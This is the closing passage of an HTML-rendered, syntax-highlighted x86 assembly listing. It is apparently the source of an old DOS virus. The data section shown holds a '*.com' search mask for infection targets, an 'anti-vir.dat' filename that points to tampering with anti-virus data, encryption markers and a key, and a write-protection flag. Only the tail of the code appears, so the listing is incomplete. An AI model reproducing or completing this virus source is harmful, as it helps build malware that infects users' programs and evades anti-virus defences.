    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">startit</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">com</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; infos</span><span class="sc0">
</span><span class="sc5">save</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">antiv</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'anti-vir.dat'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encrypt_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">buffer7</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">key</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ncounter</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">iswriteprot</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">temporary_seg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">build0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">buildtable</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">192</span><span class="sc4">-</span><span class="sc2">80h</span><span class="sc4">-</span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">real_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">


</span></div></body>
</html>
